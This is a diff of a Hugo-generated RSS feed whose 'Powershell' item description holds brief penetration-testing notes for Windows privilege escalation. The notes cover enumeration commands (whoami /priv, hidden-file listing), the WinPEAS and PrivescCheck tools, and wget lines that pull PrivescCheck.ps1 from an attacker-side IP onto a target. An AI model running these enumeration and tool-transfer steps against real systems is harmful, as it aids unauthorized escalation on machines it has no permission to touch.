@@ -10,12 +10,11 @@
       <link>//localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
     </image>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Sat, 25 May 2024 10:36:08 +1000</lastBuildDate><atom:link href="//localhost:1313/categories/shell/index.xml" rel="self" type="application/rss+xml" />
+    <language>en-us</language><atom:link href="//localhost:1313/categories/shell/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Powershell</title>
       <link>//localhost:1313/powershell/</link>
-      <pubDate>Sat, 25 May 2024 10:36:08 +1000</pubDate>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>//localhost:1313/powershell/</guid>
       <description>whoami /priv whoami /all gci -recurse . gci -recurse -hidden . Manual Enum - C:\Users - C:\ - C:\Windows\Temp Auto Enum - Winpeas - PrivesCheck (https://github.com/itm4n/PrivescCheck) - . .\PrivescCheck.ps1; Invoke-PrivescCheck Transfer - wget http://$ip/ -UseBasicParsing -OutFile $file.ext wget http://10.4.59.208:8000/PrivescCheck.ps1 -UseBasicParsing -OutFile PrivescCheck.ps1``` --- Thanks for reading </description>
